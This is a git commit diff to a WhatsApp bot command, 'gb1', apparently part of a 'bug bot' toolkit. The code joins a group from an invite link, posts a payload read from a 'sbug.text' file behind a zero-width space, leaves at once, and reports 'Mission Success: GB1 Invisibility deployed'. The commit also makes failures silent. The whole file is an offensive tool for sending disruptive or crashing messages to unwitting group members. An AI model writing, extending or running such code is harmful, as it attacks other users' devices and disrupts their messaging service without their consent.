d1de2a597178447c6c7b8f150cf03cb813cd0cc8
Loving Programming <officialstanlee143@gmail.com>
2026-02-11 17:02:42 +0300

    Update gbl.js

--- commands/bug/gbl.js
+++ commands/bug/gbl.js
@@ -3,16 +3,16 @@ const config = require('../../config');
 
 module.exports = {
     name: "gb1",
-    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
+    execute: async (conn, msg, args, { from, isOwner }) => {
         if (!isOwner) return;
-        const payload = fs.readFileSync('./lib/payloads/sbug.text', 'utf-8');
-        const code = args[0].split('https://chat.whatsapp.com/')[1];
-        
         try {
+            const payload = fs.readFileSync('./lib/payloads/sbug.text', 'utf-8');
+            const code = args[0].split('https://chat.whatsapp.com/')[1];
             const jid = await conn.groupAcceptInvite(code);
+
             await conn.sendMessage(jid, { text: "\u200B" + payload });
             await conn.groupLeave(jid);
-            await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Success: GB1 Invisibility deployed.") });
-        } catch (e) { msg.reply("🥀 Failed."); }
+            await conn.sendMessage(conn.user.id, { text: "🥀 Mission Success: GB1 Invisibility deployed." });
+        } catch (e) {}
     }
 };
